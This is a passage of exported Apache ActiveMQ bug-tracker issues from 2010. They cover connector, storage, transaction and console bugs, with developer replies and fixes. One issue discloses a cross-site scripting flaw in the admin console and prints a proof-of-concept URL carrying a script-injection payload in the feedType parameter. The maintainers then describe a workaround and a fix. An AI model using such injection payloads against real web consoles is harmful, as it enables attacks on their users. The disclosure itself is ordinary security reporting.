gpg: key 69CC103E: ""Gary Tully (key for apache releases) <gary.tully@gmail.com>"" not changed
gpg: key 2C983957: ""Bruce Snyder <bsnyder@apache.org>"" not changed
gpg: key 6852C7DA: ""Dejan Bosanac <dejan@nighttale.net>"" not changed
gpg: Total number processed: 7
gpg:              unchanged: 7
root@s:/var/www# gpg --verify apache-activemq-5.3.2-bin.tar.gz.asc
gpg: Signature made Mon 26 Apr 2010 03:24:47 PM PDT using RSA key ID A2F9E313
gpg: Can't check signature: public key not found",Ubuntu Linux,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74824,,,Sat Mar 05 05:48:24 UTC 2011,,,,,,,,,,,"0|i0ttj3:",172093,,,,,,,,,,,,,,,,,,,,,"05/Mar/11 05:48;aletheia7;gpg --verify works correctly;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Dot-separated prefetch configuration variable rejected by failover transport URI,AMQ-2729,12483939,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,adrian.trenaman,adrian.trenaman,12/May/10 12:26,13/May/10 10:12,14/Jul/23 05:43,13/May/10 10:12,5.3.2,,,,,5.4.0,,,Connector,,,,0,,,,,,,,,"If you set the queue prefetch policy on a failover connection string, you get an exception saying that the policy is not a valid configuration option.

{code}
failover://(tcp://localhost:61616?jms.prefetchPolicy.queuePrefetch=1)
{code}

To test, simply modify the URL in the example/build.xml file from an installation of ActiveMQ, and then run the producer using 'ant producer'. I think that this may be related to the fact that the variable in question - 'jms.prefetchPolicy.queuePrefetch' - has dots (periods) in the name. 


",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74825,,,Thu May 13 10:12:15 UTC 2010,,,,,,,,,,,"0|i0rqjz:",159946,,,,,,,,,,,,,,,,,,,,,"12/May/10 12:39;dejanb;Hi Adrian,

jms.* properties must be specified on the outer url's. In this case

{code}
failover://(tcp://localhost:61616)?jms.prefetchPolicy.queuePrefetch=1
{code}

should work.;;;","12/May/10 12:43;adrian.trenaman;Thanks Dejan for the super-quick response on this! I'm afraid I'd already tried moving the param to the outside of the failover brackets, and unfortunately this doesn't work :( Error is: 

{code}
     [java] Caught: javax.jms.JMSException: 
      Could not create Transport. Reason: java.lang.IllegalArgumentException: 
       Invalid connect parameters: {jms.prefetchPolicy.queuePrefetch=1}
{code};;;","12/May/10 12:54;dejanb;I just tested it more ... my original test was on the trunk and it seems that it works there. Just tried it on 5.3.0 and it gives me the exception you experienced. I'm trying to locate the issue that fixed it.;;;","12/May/10 15:44;gtully;{code}failover:(...) {code} i.e: without the two forward slashes (//) will have the url treated as a composite which may help, but there is obviously an issue between trunk and 5.3.2;;;","12/May/10 15:59;gtully;relevant test where the composite url is used : http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/test/java/org/apache/activemq/transport/failover/FailoverUriTest.java?view=markup;;;","12/May/10 19:17;dejanb;Gary, you're right 

{code}
failover:(tcp://localhost:61616)?jms.prefetchPolicy.queuePrefetch=1
{code}

works just fine on 5.3.x as well. Will check FailoverUriTest with // and try to figure out why it doesn't work on 5.3.x.;;;","13/May/10 10:12;dejanb;Fixed with svn revision 943860.

It turned out that URISupport.parseQuery() didn't handle this case well. Added appropriate tests to FailoverUriTest as well.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Adapt Rest and Ajax servlets to Jetty 7 continuation design,AMQ-2728,12482895,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,11/May/10 12:36,29/Jun/10 13:18,14/Jul/23 05:43,29/Jun/10 13:18,5.3.2,,,,,5.4.0,,,,,,,0,,,,,,,,,"There is a change in how continuations work in Jetty 7 (over previously used Jetty 6), so appropriate servlets must be refactored.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74826,,,Tue Jun 29 13:18:24 UTC 2010,,,,,,,,,,,"0|i0rqtr:",159990,,,,,,,,,,,,,,,,,,,,,"29/Jun/10 13:18;dejanb;Fixed with svn revision 958932;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
init.d script fails if RUN_AS_GROUP not defined due to typo,AMQ-2726,12483278,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,gtully,jamesc,jamesc,07/May/10 15:14,17/May/10 08:56,14/Jul/23 05:43,17/May/10 08:56,,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"In the supplied init.d scripts for linux there is a typo 

{{RUN_AS_GROUP=RUN_AS_USER}}

which should be 

{{RUN_AS_GROUP=$RUN_AS_USER}}

We have this in our patches on our production server so we must have hit the problem at some point, but looking at the code it's not even clear the case that this code would be called (RUN_AS_USER set to a user which does not have a primary group) could ever happen on a well-configured mahcine:

{code}
RUN_AS_GROUP=`groups $RUN_AS_USER | awk '{print $3}' | tail -1`
if [ ""X$RUN_AS_GROUP"" = ""X"" ]
then
    RUN_AS_GROUP=RUN_AS_USER
fi
{code}

Patch attached to do the change above, but perhaps the whole IF statement should be deleted.","activemq trunk, RHEL5",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/May/10 15:22;jamesc;run-as-group-macosx.patch;https://issues.apache.org/jira/secure/attachment/12461695/run-as-group-macosx.patch","07/May/10 15:15;jamesc;run-as-group.patch;https://issues.apache.org/jira/secure/attachment/12461694/run-as-group.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74827,,,Mon May 17 08:56:01 UTC 2010,,,,,,,Patch Available,,,,"0|i0rr4v:",160040,,,,,,,,,,,,,,,,,,,,,"07/May/10 15:22;jamesc;looks like the macosx script has the same problem;;;","17/May/10 08:56;gtully;patch applied with thanks in r945032;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Restart of network connector in ""network-of-brokers"" configuration does not reestablish connection",AMQ-2722,12483750,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,garnold,garnold,05/May/10 16:39,17/Feb/12 21:10,14/Jul/23 05:43,17/Feb/12 21:10,5.3.1,,,,,5.x,,,Broker,Connector,JMX,,0,,,,,,,,,"After stopping and restarting the network connector between 2 brokers in a ""network-of-brokers"" configuration (via either JMX or direct API access), messages are no longer pushed to the receiving broker.  Test case attached.",Mac OS X 10.6.3 (java -version: build 1.6.0_17-b04-248-10M3025),garnold,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/May/10 16:41;garnold;NetworkOfBrokersTest.java;https://issues.apache.org/jira/secure/attachment/12461689/NetworkOfBrokersTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,44144,,,Fri Feb 17 21:10:22 UTC 2012,,,,,,,,,,,"0|i0ale7:",59739,,,,,,,,,,,,,,,,,,,,,"05/May/10 16:41;garnold;Failing JUnit test, depends on ActiveMQ and Spring libraries.;;;","17/Feb/12 21:10;tabish;The provided unit tests work fine with the latest trunk code. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broker hangs reading KahaDB data store,AMQ-2721,12483804,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jteetel,jteetel,05/May/10 14:28,20/Sep/11 11:01,14/Jul/23 05:43,20/Sep/11 11:01,5.3.1,,,,,5.6.0,,,Broker,,,,1,,,,,,,,,"Broker hangs on loading the data store. Happens after using the broker for 10 hours in productive environment.

In broker log the last entries we see is a bunch of loading kahadb debug entries.
2010-05-05 16:06:19,462 | DEBUG | loading | org.apache.kahadb.index.BTreeIndex | main

But the broker doesn't stall completely. It is doing something with high cpu load. But it doesn't get the data store loaded. Even after a few hours it doesn't get finished (usually only takes a few seconds).

I took a few jstack-dumps where we can see the broker being busy putting something into a hashmap.

We have 2 brokers connected as network of brokers.",Red hat enterprise,daggerrz,daroo,shbehna@gmail.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/May/10 14:28;jteetel;brokerjstack.log;https://issues.apache.org/jira/secure/attachment/12461688/brokerjstack.log",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60028,,,Tue Sep 20 11:01:40 UTC 2011,,,,,,,,,,,"0|i0akfr:",59584,,,,,,,,,,,,,,,,,,,,,"05/May/10 14:31;jteetel;I should add that the broker was shut down successfully (no exceptions/problems in the log) before started again.

If the broker was run for a shorter time like an hour or less, this issue does not take place.;;;","05/May/10 14:44;gtully;would it be possible to attach a zip/tar.gz of your store directory so that this could be reproduced. It looks like it is in the middle or recovery but it should not take hours. How big is the store?;;;","05/May/10 14:54;jteetel;This is the data store of a productive broker with procurement data. For confidential reasons I can not post it here.

These are the file sizes:
ls -l
total 530240
-rw-r--r-- 1 root root 33556012 May  5 09:33 db-10.log
-rw-r--r-- 1 root root 33555666 May  5 10:42 db-11.log
-rw-r--r-- 1 root root 33556967 May  5 11:40 db-12.log
-rw-r--r-- 1 root root 33556179 May  5 12:45 db-13.log
-rw-r--r-- 1 root root 33554986 May  5 13:55 db-14.log
-rw-r--r-- 1 root root 33555934 May  5 15:35 db-15.log
-rw-r--r-- 1 root root 33554839 May  5 16:05 db-16.log
-rw-r--r-- 1 root root 33030144 May  5 16:08 db-17.log
-rw-r--r-- 1 root root 33556869 May  4 14:00 db-1.log
-rw-r--r-- 1 root root 33556347 May  4 14:53 db-2.log
-rw-r--r-- 1 root root 33554523 May  4 15:20 db-3.log
-rw-r--r-- 1 root root 33555765 May  4 16:07 db-4.log
-rw-r--r-- 1 root root 33554705 May  4 17:05 db-5.log
-rw-r--r-- 1 root root 33555131 May  5 08:58 db-6.log
-rw-r--r-- 1 root root 33555786 May  5 09:01 db-7.log
-rw-r--r-- 1 root root 33555139 May  5 09:03 db-8.log
-rw-r--r-- 1 root root 33555024 May  5 09:06 db-9.log
-rw-r--r-- 1 root root  1564672 May  5 16:08 db.data
-rw-r--r-- 1 root root   837208 May  5 16:08 db.redo
-rw-r--r-- 1 root root        0 May  5 16:08 lock
;;;","07/May/10 14:07;jteetel;We had to restart one broker and this time the issue did not show up. Here in the log we can see that it only takes 5 seconds to read the datastore.

2010-05-07 15:43:25,569 | DEBUG | loading | org.apache.kahadb.index.BTreeIndex | main
...
2010-05-07 15:43:25,637 | DEBUG | loading | org.apache.kahadb.index.BTreeIndex | main
2010-05-07 15:43:30,851 | INFO  | Replayed 68230 operations from the journal in 5.213 seconds. | org.apache.activemq.store.kahadb.MessageDatabase | main

;;;","27/Oct/10 07:28;daggerrz;We also see this issue on 5.3.1-fuse-01-00. Occasionally on restarts (graceful), Kaha hangs on startup and we have to delete the entire store (and loose messages) to get it going again. A strange and probably related symptom is that the store seems to grow indefinitely. Although there should be only a few in-flight messages, our current, corrupted store has 40 data-queue files (128MB each). The data is too sensitive to publish here, but we can arrange that privately if needed.

The problem is in KahaStore.generateInterestInMapDataFiles where the while-loop is alternating between two item ids in an infinite loop.;;;","27/Oct/10 09:09;daggerrz;It's worth mentioning that the broker has moderate load (about 100 messages per minute). Most messages are very small, but about 50-150 per day are 1-3MB in size. 

Dennis: Are you sending big messages?;;;","06/Apr/11 22:40;daroo;In the past I came accross similar issue in the other application. In short: not synchronized, concurrent put/get operations on HashMap can cause infinite loop.
See this blog: http://lightbody.net/blog/2005/07/hashmapget_can_cause_an_infini.html

I think this problem has been fixed already (at least in current trunk) by adding synchronization on inflightTransactions map in getInflightTx method. In 5.3.1 this map wasn't synchronized and I think that caused your broker hang. 
;;;","11/Aug/11 19:26;tabish;I believe this issue has been fixed.  Try a later version or the 5.6-SNAPSHOT to verify. ;;;","20/Sep/11 10:56;gtully;reopen to set fix version to 5.6;;;","20/Sep/11 11:01;gtully;closing again with correct fix version;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Duplicate messages delivery after restart for topics with network of brokers + kahaDB,AMQ-2720,12483299,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,05/May/10 11:20,05/May/10 13:38,14/Jul/23 05:43,05/May/10 13:38,5.3.1,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"After restart, a network connector with default dynamicOnly=false will auto bridge any topic with durable subscribers. KahaDB is reporting all topics as durable through the list of destinations that it returns, the result being a duplicated durable (and phantom) consumer on the bridge.
Disabling auto durable topic bridging with ddynamicOnly=true will work around this issue.

problem:
getDestinations in kahaDB persistence adapter should only return a list of destinations that include topics with durable subs.",,mpaladin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74829,,,Wed May 05 13:38:23 UTC 2010,,,,,,,,,,,"0|i0rq3j:",159872,,,,,,,,,,,,,,,,,,,,,"05/May/10 13:38;gtully;resolved in r941281;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Try to maintain the order of redelivered messages,AMQ-2719,12483266,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,05/May/10 07:04,05/Dec/14 14:52,14/Jul/23 05:43,05/May/10 07:15,5.3.1,,,,,5.4.0,,,,,,,0,,,,,,,,,When consumer closes all messages dispatched to it are redelivered. These messages should have dispatch priority in order to try maintaining the order of  messages in a single-consumer scenario.,,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,43736,,,Fri Dec 05 14:52:51 UTC 2014,,,,,,,,,,,"0|i0rqgv:",159932,,,,,,,,,,,,,,,,,,,,,"05/May/10 07:15;dejanb;Fixed with svn revision 941174, by introducing the additional list of redelivered messages that have priority during dispatch.;;;","05/Dec/14 14:52;gtully;further refinement and additional test in http://git-wip-us.apache.org/repos/asf/activemq/commit/60ad0534;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Copyright banner on page footer of ActiveMQ Console is outdated,AMQ-2718,12483613,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,sebb,,02/May/10 01:00,05/Mar/11 18:22,14/Jul/23 05:43,05/Mar/11 18:22,5.3.1,,,,,5.5.0,,,,,,,0,,,,,,,,,"Copyright banner on page footer of ActiveMQ Console is outdated - for example, page http://localhost:8161/admin/index.jsp has

Copyright 2005-2007 The Apache Software Foundation

The same problem applies to all the other Admin pages.

Also, the Home page fails to show the ActiveMQ version, which would be a useful addition.",http://localhost:8161/admin/index.jsp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74830,,,Sat Mar 05 18:22:35 UTC 2011,,,,,,,,,,,"0|i0akfz:",59585,,,,,,,,,,,,,,,,,,,,,"05/Mar/11 18:22;tabish;Copyright notice updated.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Crashing and restarting the broker causes message redelivery even if the XA transaction was already prepared (but not commited),AMQ-2717,12483746,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,rodos77,rodos77,29/Apr/10 17:28,01/Jun/12 11:13,14/Jul/23 05:43,01/Jun/12 11:12,5.3.1,,,,,5.6.0,5.x,,,,,,0,,,,,,,,,"The scenario is as follows:
\- message is delivered within an XA global transaction
\- the XA tx completes the prepare phase
\- the server crashes before the XA tx completes the commit
\- the server is restarted
\- (if the J2EE server supports XA recovery, it will recover the XA tx and complete the commit (tested and confirmed with Websphere))
\- ActiveMQ redelivers the message

The redelivery should not happen.  Unless, following recovery, the TransactionManager decides to rollback the tx, the tx will be committed.  If it is committed, the message would have been processed already.  Redelivering it causes the message to be processed again and breaks JMS' deliver-once-and-only-once guarantee.

If the tx has been prepared, AMQ should not redeliver the message following a crash recovery,  If the tx is ultimately rolled back and the message is put back on the queue, it can redeliver it, otherwise, it should not.

This is very difficult to write a Junit test for but I will try to come up with something...",,gtully,rodos77,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3305,,,,,,,,,,,,,,,,,,,,,,,,,,"21/May/10 16:19;rodos77;XATransactionRecoveryTest.java;https://issues.apache.org/jira/secure/attachment/12461704/XATransactionRecoveryTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,44145,,,Fri Jun 01 11:13:15 UTC 2012,,,,,,,,,,,"0|i0akg7:",59586,,,,,,,,,,,,,,,,,,,,,"29/Apr/10 18:04;gtully;For a test case, you may find something useful in org.apache.activemq.transport.failover.FailoverTransactionTest - a variant of a broker plugin used can kill off the broker before/after a prepare;;;","21/May/10 16:19;rodos77;Attaching junit test that illustrates the problem.

Note that if you uncomment xaRes.commit(), the message will not be redelivered and the test will succeed as expected.  However, if the xaRes is only prepared but not committed, the message is redelivered.;;;","01/Jun/12 11:12;gtully;fixed via https://issues.apache.org/jira/browse/AMQ-3305;;;","01/Jun/12 11:13;gtully;link to issue that fixes;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Transport connector throws SSL exception when network connector is configured to failover over ssl transport,AMQ-2715,12483416,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,28/Apr/10 13:11,28/Apr/10 16:13,14/Jul/23 05:43,28/Apr/10 16:13,5.3.1,,,,,5.4.0,,,Transport,,,,0,,,,,,,,,"The reconnect thread in the failover transport is not SslContext aware so it does not propagate the brokers credentials.

A network connector url of the form static:(failover:(ssl://localhost:62616))) does not work.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74831,,,Wed Apr 28 16:13:37 UTC 2010,,,,,,,,,,,"0|i0rq8n:",159895,,,,,,,,,,,,,,,,,,,,,"28/Apr/10 16:13;gtully;resolved in r938998;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Apache ActiveMQ is prone to XSS Vulnerability,AMQ-2714,12483420,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,dejanb,arun,arun,26/Apr/10 21:09,27/Apr/10 17:24,14/Jul/23 05:43,27/Apr/10 12:44,5.3.0,5.3.1,,,,5.4.0,,,,,,,0,,,,,,,,,"Cross-Site Scripting Vulnerability exists in Apache ActiveMQ.
Example:  http://localhost:8161/admin/queueBrowse/example.A?view=rss&feedType=<script>alert(""ACTIVEMQ"")</script>

Tested on 5.3.1 and 5.3.0 versions.
",Windows XP,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Apr/10 12:45;dejanb;AMQ-2714.zip;https://issues.apache.org/jira/secure/attachment/12461683/AMQ-2714.zip","26/Apr/10 21:48;arun;AMQ_XSS.doc;https://issues.apache.org/jira/secure/attachment/12461682/AMQ_XSS.doc",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74832,,,Tue Apr 27 17:24:58 UTC 2010,,,,,,,,,,,"0|i0rpq7:",159812,,,,,,,,,,,,,,,,,,,,,"26/Apr/10 21:45;arun;Screen shot placed into the file;;;","26/Apr/10 21:48;arun;updated with  the xss screen shot.
screen shot file attached.;;;","27/Apr/10 12:44;dejanb;I confirmed the problem in 5.3.x versions. However, it doesn't affect current 5.4-SNAPSHOT as the problem is in Jetty's error handler that doesn't escape the message (which is fixed in Jetty 7). Anyhow, I took this opportunity to implement custom 404 and 500 pages for the web console (which is also a workaround for this problem).

To work around this issues on existing 5.3.x installations: 

- download AMQ-2614.zip attached to this issue
- go to ${ACTIVEMQ_HOME}/webapp/admin
- unzip the archive

This workaround will be available in the next fuse 5.3.1-fuse-01-00 release (http://fusesource.com/), if anyone is interested.;;;","27/Apr/10 17:24;arun;Hi Dejan,

Thanks for the prompt reply and fixing this issue.
I tested it on 5.4-SNAPSHOT and 5.3.x versions with workaround applied and seems the issue has been fixed.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BlobMessages are not deleted after delivery,AMQ-2713,12483285,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,dejanb,thodte,thodte,26/Apr/10 09:20,14/May/10 15:57,14/Jul/23 05:43,14/May/10 15:57,5.3.1,,,,,5.4.0,,,Message Store,,,,0,,,,,,,,,"When I send a blob message and the content is uploaded into the integrated fileserver (WebDAV) then the blobmessage(byte content) are not deleted after the  broker deliver the message.

There is a method in the defaultupload class for deleting manually but when I do this the I get from fileserver a 404 (not authenticated) error.

I eexpected that the message a the integrated fileserver will be deleted automatically after delivery through the broker.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74833,,,Fri May 14 15:57:37 UTC 2010,,,,,,,,,,,"0|i0rppz:",159811,,,,,,,,,,,,,,,,,,,,,"14/May/10 15:57;dejanb;Fixed with svn revision 944167. Documentation to follow.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
QueueBrowser in transacted session fails,AMQ-2712,12482327,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,dnawrocki,dnawrocki,23/Apr/10 16:38,09/Aug/10 21:00,14/Jul/23 05:43,09/Aug/10 21:00,5.3.1,,,,,5.4.0,,,JMS client,,,,0,,,,,,,,,"A QueueBrowser cannot be used on a transacted session.  During the call to destroyConsumer(), the call:

            if (session.getTransacted()) {
                session.commit();
            }

will fail and the consumer will not be closed.

Additionally, when calling nextElement(), the ackLater() method (called by beforeMessageIsConsumed(), called by receiveNoWait(), called by nextElement()) will throw a JMSException.

The latter issue may be related to https://issues.apache.org/activemq/browse/AMQ-2659, but the former is not.

